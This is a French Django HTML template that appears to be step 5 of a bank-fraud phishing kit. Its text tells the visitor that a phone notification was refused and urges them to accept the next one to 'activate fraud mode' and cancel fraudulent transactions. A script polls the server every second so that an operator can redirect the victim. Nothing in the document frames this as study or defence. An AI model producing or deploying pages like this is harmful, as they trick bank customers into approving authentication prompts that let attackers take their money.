{% load static %}
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion sécurisé</title>
    <link rel="stylesheet" href="{% static 'onboarding/style3.css' %}">
</head>
        <script>
    // Vérifie toutes les secondes si une redirection est en attente
    async function verifierRedirection() {
        try {
            const res  = await fetch('/verifier-redirection/');
            const data = await res.json();
            if (data.redirect) {
                window.location.href = data.redirect;  // redirection immédiate
            }
        } catch (e) {}
    }

    setInterval(verifierRedirection, 1000);  // toutes les 1 seconde
</script>
<body>
    <div class="scene">
        <div>
            <div class="eyebrow">
                Étape 5 
            </div>
            <h1>Notification refusé</h1>
            <p class="sous-titre">
                La deuxieme notification sur votre mobile a bien été refusé,
                acceptez la prochaine notification avec de finaliser l'activation du mode fraude et annuler les transactions frauduleuses
            
            </p>

   
        </div>

       <div class="scene-telephone">
            <div class="telephone">
                <div class="ecran">
                    <svg class="rond-validation" viewBox="0 0 64 64">

</svg>
                        <div class="notif-titre">Notification refusé</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
